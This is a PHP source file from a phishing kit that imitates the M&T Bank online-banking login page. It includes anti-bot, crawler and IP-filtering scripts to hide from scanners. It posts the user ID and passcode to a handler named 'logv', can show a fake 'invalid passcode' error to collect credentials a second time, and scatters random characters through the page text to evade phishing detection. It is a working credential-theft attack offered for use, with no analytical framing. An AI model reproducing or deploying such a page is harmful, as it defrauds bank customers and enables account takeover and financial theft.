<?php
error_reporting(0);
session_start();
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";

?>
<!DOCTYPE html>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <title>Welcome to Online Banking | M&amp;T Bank</title>

    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <link href="ft/css.css" rel="stylesheet">

    
<link rel="icon" sizes="96x96" href="ft/image.png" type="image/png">
<link rel="icon" sizes="32x32" href="ft/image(1).png" type="image/png">
<link rel="icon" sizes="16x16" href="ft/image(2).png" type="image/png">
	

	</head>
<body>

   

<form action="logv<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" method="post"><input id="UnMaskedUserId" name="UnMaskedUserId" type="hidden" value="">    <div class="mtb-app-enrollment">
        <header class="mtb-page-header">
            <input type="hidden" id="TagPageName" name="TagPageName" value="OLB:Login:Index">
            <div class="grid-x align-center">
                <div class="cell">
                    <a  class="mtb__logo">
                        <img src="ft/mtb-logo.svg" alt="M&amp;T Bank Site">
                    </a>
                </div>
            </div>
        </header>



            <div class="mtb-page-error <?php if(!isset($_GET[''.$theerrkey.''])){echo 'hide';};?>">
                <input data-val="true" data-val-number="The field FailedSignOnCount must be a number." data-val-required="The FailedSignOnCount field is required." id="FailedSignOnCount" name="FailedSignOnCount" type="hidden" value="3">
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        <i class="__is-icon m-icon m-icon-notification">
                            <span class="show-for-sr">Notification Icon</span>
                        </i>
                        <p>
                            
      You have entered an<?php echo rT('ALPHANUMERIC',rand(1,87));?> invalid User ID and/or<?php echo rT('ALPHANUMERIC',rand(1,87));?> Passcode. Please try again.
    
                        </p>
                    </div>
                </div>
            </div>
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                    <input type="hidden" value="OLB:SSC:LogInToOnlineBanking">
                    <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                            Log In to Online Banking
                        </h1><?php echo rT('ALPHANUMERIC',rand(1,87));?>
                        <p>
                            For Personal and<?php echo rT('ALPHANUMERIC',rand(1,87));?> Business Accounts
                        </p>
                    </div>
                </div>

                <div class="cell">
                    <label for="userId">
                        Us<?php echo rT('ALPHANUMERIC',rand(1,87));?>er I<?php echo rT('ALPHANUMERIC',rand(1,87));?>D
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="userId" name="userId" autocomplete="off" aria-required="true" data-inputtype="text" data-attribute="" maxlength="20" value="">
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="Passcode">
                        Pas<?php echo rT('ALPHANUMERIC',rand(1,87));?>scode<?php echo rT('ALPHANUMERIC',rand(1,87));?>
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" data-fc-id="122" type="password" id="Passcode" name="Passcode" autocomplete="off" aria-required="true" data-inputtype="tel" maxlength="20">
                        
                    </div>
                </div>

                <div class="cell">
                    <div class="mtb-formcheckbox">
                        <input class="show-for-sr" type="checkbox" id="RememberUserId" name="RememberUserId" value="false">
                        <label for="RememberUserId" class="__spacer-remove">
                           <?php echo rT('ALPHANUMERIC',rand(1,87));?> Rememb<?php echo rT('ALPHANUMERIC',rand(1,87));?>er Us<?php echo rT('ALPHANUMERIC',rand(1,87));?>er ID<?php echo rT('ALPHANUMERIC',rand(1,87));?>
                        </label>
                    </div>
                </div>
            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">

                    <button type="submit" name="btnin" value="login" class="button button__form-no-spacer expanded" id="btnSubmit">
                        Log In
                    </button>
                </div>
                <div class="cell">
                    <a  class="button button__fake-padding-no-spacer expanded clear" id="jsAnalyticsLink">He<?php echo rT('ALPHANUMERIC',rand(1,87));?>lp with User ID<?php echo rT('ALPHANUMERIC',rand(1,87));?> or Passcode</a>
                </div>
                <div class="cell">
                    <a  class="button button__fake-padding expanded clear" id="jsAnalyticsEnrollLink" data-attribute="item">Enroll<?php echo rT('ALPHANUMERIC',rand(1,87));?> Now</a>
                </div>

                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unau<?php echo rT('ALPHANUMERIC',rand(1,87));?>thorized<?php echo rT('ALPHANUMERIC',rand(1,87));?> access is<?php echo rT('ALPHANUMERIC',rand(1,87));?> prohibited. <?php echo rT('ALPHANUMERIC',rand(1,87));?>Us<?php echo rT('ALPHANUMERIC',rand(1,87));?>age may be m<?php echo rT('ALPHANUMERIC',rand(1,87));?>onitor<?php echo rT('ALPHANUMERIC',rand(1,87));?>ed.
                </p>
            </div>
        </div>

        <hr class="__spacer-section">
        <div class="mtb-app-default--content">

            <div class="grid-x grid-padding-x grid-x__padded">
                <div class="cell text-center">
                    <p class="__font-size-secondary">
                        Have quest<?php echo rT('ALPHANUMERIC',rand(1,87));?>ions <?php echo rT('ALPHANUMERIC',rand(1,87));?>about M&amp;T Onl<?php echo rT('ALPHANUMERIC',rand(1,87));?>ine <?php echo rT('ALPHANUMERIC',rand(1,87));?>Bank<?php echo rT('ALPHANUMERIC',rand(1,87));?>ing?
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Personal<?php echo rT('ALPHANUMERIC',rand(1,87));?> Accounts:
                        <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday -<?php echo rT('ALPHANUMERIC',rand(1,87));?> Friday 8am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
                       <?php echo rT('ALPHANUMERIC',rand(1,87));?> Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday<?php echo rT('ALPHANUMERIC',rand(1,87));?> - Friday 6am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-section __color-gray-accent">
                        Saturday - Su<?php echo rT('ALPHANUMERIC',rand(1,87));?>nday 9am - 5pm ET
                    </p>
                </div>
            </div>
        </div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a  class="" >Get Started Guide</a>
                        <a  >Secu<?php echo rT('ALPHANUMERIC',rand(1,87));?>rity <?php echo rT('ALPHANUMERIC',rand(1,87));?>Assistance</a>
                        <a  >Digital<?php echo rT('ALPHANUMERIC',rand(1,87));?> Service Agreement</a>
                        <a  >ESi<?php echo rT('ALPHANUMERIC',rand(1,87));?>gn Agreement</a>
                        <a  >
                            Accessib<?php echo rT('ALPHANUMERIC',rand(1,87));?>ility<?php echo rT('ALPHANUMERIC',rand(1,87));?>
                        </a>


                        <a  >
                            mtb.<?php echo rT('ALPHANUMERIC',rand(1,87));?>com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            ©<?php echo date("Y");?><?php echo rT('ALPHANUMERIC',rand(1,87));?> M&amp;<?php echo rT('ALPHANUMERIC',rand(1,87));?>T Bank.<?php echo rT('ALPHANUMERIC',rand(1,87));?> All Rights Rese<?php echo rT('ALPHANUMERIC',rand(1,87));?>rved.<br>
                            Users of this<?php echo rT('ALPHANUMERIC',rand(1,87));?> website agree to be<?php echo rT('ALPHANUMERIC',rand(1,87));?> bound by the prov<?php echo rT('ALPHANUMERIC',rand(1,87));?>isions of the M&amp;T website <a  >
                                Terms of
                                Use
                            </a> and <a  >Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a  >
                                <img src="ft/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                            </a>
                            <a  >
                                <img src="ft/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                            </a>
                        </div>
                        <p>
                            Equal Hou<?php echo rT('ALPHANUMERIC',rand(1,87));?>sing<?php echo rT('ALPHANUMERIC',rand(1,87));?> Lender NMLS <?php echo rT('ALPHANUMERIC',rand(1,87));?>#38<?php echo rT('ALPHANUMERIC',rand(1,87));?>1076
                            <a  >Member FDI<?php echo rT('ALPHANUMERIC',rand(1,87));?>C</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</form>





</body></html>